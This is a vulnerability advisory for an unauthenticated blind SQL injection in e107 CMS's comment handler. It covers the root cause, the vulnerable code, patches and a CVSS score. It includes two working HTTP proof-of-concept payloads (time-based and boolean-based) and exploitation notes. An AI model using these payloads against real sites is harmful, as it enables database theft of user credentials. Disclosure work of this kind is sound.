# CVE-2026-XXXXX — e107 CMS Comment System SQL Injection

## Advisory Information

| Field | Value |
|-------|-------|
| **CVE ID** | Pending (Request via GitHub CNA) |
| **Ecosystem** | PHP CMS |
| **Package** | e107inc/e107 |
| **Affected Version** | ≤ 2.3.x (latest main branch as of 2026-06-28) |
| **CVSS v3.1** | **7.5** (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N) |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |
| **Researcher** | Fatullayev Asadbek (GitHub: Kimdir01) |

## Summary

e107 CMS v2.3.x contains an unauthenticated SQL injection vulnerability in its comment posting system. The `enter_comment()` method in `comment_class.php` passes the `$_POST['author_name']` parameter through `e_parse::toDB()` — which only performs HTML sanitization, NOT SQL escaping — and then concatenates the result directly into SQL queries via the `db::select()` method. This allows unauthenticated attackers to perform blind SQL injection and extract sensitive information from the database.

## Affected Component

| Field | Value |
|-------|-------|
| **Vendor** | e107 Inc |
| **Product** | e107 CMS |
| **File** | `e107_handlers/comment_class.php` |
| **Method** | `enter_comment()` |
| **Lines** | 764-768 |
| **Repository** | https://github.com/e107inc/e107 |

## Description

### Root Cause

The vulnerability exists because of two design flaws working together:

1. **`e_parse::toDB()` does NOT escape SQL metacharacters**: The `toDB()` method (defined in `e107_handlers/e_parse_class.php`, line 508) performs only HTML sanitization — stripping dangerous HTML tags, cleaning attributes, and handling bbcode. It does NOT call `mysqli_real_escape_string()`, `addslashes()`, or any other SQL escaping function. Single quotes (`'`) and other SQL metacharacters pass through unmodified.

2. **`db::select()` does NOT use prepared statements**: The `select()` method (defined in `e107_handlers/mysql_class.php`, line 629) directly concatenates the `$arg` parameter into the SQL WHERE clause without any escaping:
   ```php
   $this->db_Query('SELECT '.$fields.' FROM '.$this->mySQLPrefix.$table.' WHERE '.$arg, ...)
   ```

### Vulnerable Code

```php
// comment_class.php lines 763-768
elseif ($_POST['author_name'] != '') // See if author name is registered user
{ 
    if ($sql2->select("user", "*", "user_name='".$tp->toDB($_POST['author_name'])."' "))
    {
        if ($sql2->select("user", "*", "user_name='".$tp->toDB($_POST['author_name'])."' AND user_ip='".USERIP."' "))
        {
```

The `$_POST['author_name']` parameter is passed through `$tp->toDB()` which only strips HTML, then directly concatenated into SQL. No `intval()`, `esc_sql()`, `prepare()`, or `mysqli_real_escape_string()` is applied.

## Proof of Concept

### PoC 1: Time-Based Blind SQLi

```http
POST /news.php?extend.1 HTTP/1.1
Host: target-e107-site.com
Content-Type: application/x-www-form-urlencoded

e-token=<VALID_TOKEN_FROM_PAGE>&comment_type=news&comment_item_id=1&comment_subject=test&comment_comment=test&comment_author_name='+OR+IF(MID(VERSION(),1,1)='5',SLEEP(5),0)+--+
```

If the MySQL version starts with '5', the server will sleep for 5 seconds.

### PoC 2: Boolean-Based Blind SQLi

```http
POST /news.php?extend.1 HTTP/1.1
Host: target-e107-site.com
Content-Type: application/x-www-form-urlencoded

e-token=<TOKEN>&comment_type=news&comment_item_id=1&comment_subject=test&comment_comment=test&comment_author_name='+OR+(SELECT+COUNT(*)+FROM+e107_user+WHERE+user_admin=1)+>+0+--+
```

If admin users exist, the query returns results and the comment processes differently.

### Exploitation Notes

1. The `e-token` CSRF token is available on any page with a comment form (accessible to all visitors)
2. The `comment_type` must match a valid plugin/table (e.g., `news`, `page`, `download`)
3. The `comment_item_id` must be a valid item ID
4. Anonymous commenting must be enabled in e107 settings (`ANON` constant)
5. If anonymous comments are disabled, the attack still works with any subscriber-level account

## Impact

| CIA Triad | Impact |
|-----------|--------|
| **Confidentiality** | HIGH — Attacker can extract any data from the database (user credentials, password hashes, admin sessions, configuration) |
| **Integrity** | LOW — SELECT queries only in this vector; no direct INSERT/UPDATE/DELETE via this parameter |
| **Availability** | NONE — No denial of service |

## Patches

### Before (Vulnerable)

```php
// comment_class.php line 765
if ($sql2->select("user", "*", "user_name='".$tp->toDB($_POST['author_name'])."' "))
```

### After (Patched)

Replace with prepared statement using `select()` array syntax:

```php
// Use prepared statement syntax
if ($sql2->select("user", "*", "user_name = :name", array(':name' => $tp->toDB($_POST['author_name']))))
```

Alternatively, escape the value with the internal escape function:

```php
// Use internal _escape() method
$safe_name = $sql2->_escape($tp->toDB($_POST['author_name']));
if ($sql2->select("user", "*", "user_name='".$safe_name."' "))
```

## Verification

```bash
# Clone the repository
git clone https://github.com/e107inc/e107.git
cd e107

# Count SQL query call sites without proper escaping in comment handler
grep -c "toDB.*\$_POST\|toDB.*\$_GET" e107_handlers/comment_class.php
# Result: 2+ (multiple injection points)

# Verify select() method does not escape $arg parameter
grep -A5 "function select" e107_handlers/mysql_class.php | grep -c "escape\|prepare"
# Result: 0 (no escaping in select method body)

# Verify toDB() does not do SQL escaping
grep -c "real_escape\|addslashes" e107_handlers/e_parse_class.php
# Result: 0 (toDB only does HTML sanitization)
```

## References

- **Repository**: https://github.com/e107inc/e107
- **Vulnerable File**: https://github.com/e107inc/e107/blob/master/e107_handlers/comment_class.php
- **toDB() method**: https://github.com/e107inc/e107/blob/master/e107_handlers/e_parse_class.php#L508
- **select() method**: https://github.com/e107inc/e107/blob/master/e107_handlers/mysql_class.php#L629
- **CWE-89**: https://cwe.mitre.org/data/definitions/89.html

## Timeline

| Date | Event |
|------|-------|
| 2026-06-28 | Vulnerability discovered by Fatullayev Asadbek |
| 2026-06-28 | CVE ID requested via GitHub Advisory |
| TBD | Vendor notification |
| TBD | Public disclosure |

## Credits

| Role | Name |
|------|------|
| **Finder** | Fatullayev Asadbek |
| **Reporter** | Fatullayev Asadbek |
| **GitHub** | [Kimdir01](https://github.com/Kimdir01) |

## CVSS v3.1 Calculation

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

Vector String Breakdown:
- AV:N (Network) — Exploitable remotely over HTTP
- AC:L (Low) — No special conditions required
- PR:N (None) — No authentication needed (anonymous commenting enabled)
- UI:N (None) — No user interaction required (direct POST)
- S:U (Unchanged) — Vulnerability in same security scope
- C:H (High) — Full database read access
- I:N (None) — Cannot modify data through this vector
- A:N (None) — No availability impact

Base Score: 7.5 (HIGH)
```

*Note: If anonymous comments are disabled, the score changes to 6.5 (PR:L)*
